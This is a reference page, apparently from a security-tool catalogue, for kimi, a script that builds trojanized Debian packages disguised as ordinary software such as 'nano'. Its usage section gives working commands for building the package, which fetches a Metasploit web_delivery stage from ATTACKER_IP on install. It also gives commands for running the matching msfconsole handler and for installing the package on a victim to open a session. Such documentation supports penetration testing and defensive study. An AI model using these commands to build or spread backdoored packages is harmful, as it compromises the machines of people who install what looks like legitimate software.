---
name: "kimi"
categories:
  - blackarch-backdoor
version: "28.e7cafda"
homepage: "https://github.com/ChaitanyaHaritash/kimi"
packaged-by: [blackarch]
blackarch-builddate: "2024-12-25"
build-system: scripts
license: custom:unknown
meta-checked: "2026-11-09"
github-repo: "ChaitanyaHaritash/kimi"
github-stars: 125
github-pushed: "2019-04-24"
github-archived: false
github-issues: 0
github-match: "exact"
gh-checked: "2026-11-07"
worth: 2.5
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 0
gh-activity-checked: "2026-11-09"
---

# kimi

> Python script that builds a trojanized Debian package around a Metasploit web_delivery payload, firing on install via its `postinst` hook.

## What it's for

kimi generates malicious `.deb` packages that impersonate legitimate software (the `-n` name is arbitrary, so it can masquerade as any utility). Internally it writes a payload launcher, packages it with `dpkg-deb`, and adds a `postinst` maintainer script so the backdoor executes the moment the victim installs the package — no extra social engineering step after install. The dropped file lands in `/usr/local/bin/<name>`, is marked setgid-root-class (mode 2755), and behaves like a system command: it fetches and runs a Python stage from a Metasploit `exploit/multi/script/web_delivery` handler, and it also fires whenever the victim later runs that "command". kimi is standalone (needs no GUI package builder) and writes a `handler.rc` that auto-launches msfconsole for you. Note the tool's age (2019-era, Python 2/3 straddling) and that a sample generated with it has been seen in the wild — treat any artifact it produces as live malware.

*No corpus evidence — derived from upstream documentation.*

## Typical use cases

### Generate a trojanized package aimed at your handler

Create a fake package whose postinst pulls a web_delivery stage from your host.

```
sudo python kimi.py -n nano -l ATTACKER_IP -p 8080 -u /SecPatch -V 1.0 -a amd64
```

Outcome: kimi builds a `.deb` for the impersonated package name (version 1.0, amd64), embeds the fetcher pointing at `ATTACKER_IP:8080/SecPatch`, and opens a Metasploit handler automatically via the generated `handler.rc` in a new terminal — a session arrives as soon as someone installs the package.

### Run the matching web_delivery handler manually

If you prefer your own msfconsole instead of the auto-generated one, mirror kimi's settings.

```
msfconsole -q
use exploit/multi/script/web_delivery
set SRVHOST ATTACKER_IP
set URIPATH /SecPatch
set LHOST ATTACKER_IP
exploit
```

Outcome: the handler serves the Python stage at `/SecPatch` on your SRVHOST; values must match the `-l`, `-p` and `-u` arguments passed to kimi.py or the installed package's fetch fails silently.

### Install-test the package on a lab victim

Reproduce the firing behavior in a disposable VM.

```
sudo dpkg -i nano_1.0_amd64.deb
```

Outcome: during install the package's `postinst` runs, the payload drops to `/usr/local/bin/nano` (mode 2755) and immediately calls the handler — a meterpreter/script session opens on your listener; running the "command" again re-triggers the callback.
